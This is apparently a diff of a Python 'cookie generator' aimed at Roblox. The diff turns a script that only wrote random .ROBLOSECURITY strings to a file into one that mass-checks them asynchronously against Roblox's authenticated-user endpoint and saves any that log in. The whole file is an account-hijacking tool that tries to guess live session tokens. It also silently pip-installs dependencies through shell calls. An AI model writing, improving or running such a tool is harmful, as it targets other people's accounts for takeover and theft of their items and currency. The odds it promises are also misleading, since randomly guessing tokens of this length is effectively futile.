@@ -1,47 +1,83 @@
-import re
-import string
-import requests
+import subprocess
+try:
+    import string
+    import random
+    import asyncio
+    from aiohttp import ClientSession
+    from aiofiles import open as aioopen
+    import sys
+except:
+    subprocess.call("pip install aiofiles", shell=True)
+    subprocess.call("pip install aiohttp", shell=True)
+    subprocess.call("pip install asyncio", shell=True)
+    import string
+    import random
+    import asyncio
+    from aiohttp import ClientSession
+    from aiofiles import open as aioopen
+    import sys
 
 
-print('''INFINITY - The fastest roblox cookie generator you will ever find. 
-[!] https://discord.gg/U3Vj2rahNa | by zdvrer#8413                    
-''')
-outputfile = open("cookies.txt", "a")
 
-x = 0
 cookies = []
+invalid_cookies = []
 intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
 n = 0
-print('[RECOMMENDED: Pick a high amount for better odds of generating valid cookies]')
-c = int(input("[!] How many cookies do you want to generate? \n"))
-print('[!] Generating random cookies... please be patient! \n')
-print('Note: This doesnt check is the cookies are valid, for that please use a special script. \n')
+v = input("What is your desired amount of cookies (higher cookies generated will increase odds of generating valid cookies.")
+c = int(v)
 letters = 'ABCDEF'
+print("""______                _              _   _   _           
+| ___ \              | |            | | | | | |          
+| |_/ /  ___    ___  | |_   ___   __| | | | | | _ __     
+| ___ \ / _ \  / _ \ | __| / _ \ / _` | | | | || '_ \    
+| |_/ /| (_) || (_) || |_ |  __/| (_| | | |_| || |_) | _ 
+\____/  \___/  \___/  \__| \___| \__,_|  \___/ | .__/ (_)
+                                               | |       
+                                               |_| """)
 
-while x < c:
+invalid_count = 0
 
+async def generate_cookie():
+    global invalid_count
+    cookie =  intro +  ''.join(random.choices(letters + string.digits, k=732))
+    async with ClientSession() as session:
+        async with session.get('https://users.roblox.com/v1/users/authenticated',cookies={'.ROBLOSECURITY': cookie}) as response:
+            text = await response.text()
+            if '"id":' in text:
+                print(cookie)
+                cookies.append(cookie)
+                await write_cookies()
+                sys.exit()
+            else:
+                invalid_count += 1
+                invalid_cookies.append(cookie)
+                print("\rInvalid cookies: {}".format(invalid_count), end="")
 
-    cookies =  intro +  ''.join(random.choices(letters + string.digits, k=732))
+async def write_cookies():
+    async with aioopen("cookies.txt", "w") as n:
+        for i in cookies:
+            var = f"{i}"
+            await n.write(var)
+            await n.write(" ")
+    async with aioopen("invalid_cookies.txt", "w") as r:
+        for i in invalid_cookies:
+            var = f"{i}"
+            await r.write(var)
+            await r.write(" ")
 
-    x = x + 1
-    
-    f = open('Cookies.txt', "a+")
-    f.write(f'{cookies}\n')
-    f.close()
-    
+async def main():
+    global invalid_count
+    while True:
+        tasks = [asyncio.create_task(generate_cookie()) for i in range(c)]
+        await asyncio.gather(*tasks)
+        await write_cookies()
+        if invalid_count == c:
+            print("\nNone of the cookies were valid, retrying in 3 seconds")
+            await asyncio.sleep(3)
+            invalid_count = 0
+        else:
+            print('\n[!] Done!')
+            break
 
-if __name__ == '__main__':
-
-    number_of_threads = 900
-    print_lock = threading.Lock()
-    cookie_queue = Queue()
-    url = 'https://accountinformation.roblox.com/v1/birthdate'
-
-        
-    cookie_queue.join()
-
-outputfile.close()
-
-t1 = time.time()
-print('[!] Done! Successfully generated all the desired cookies in cookies.txt.')
-input("Press enter to exit.")
+asyncio.run(main())
+input("\nPress enter to exit.\n")
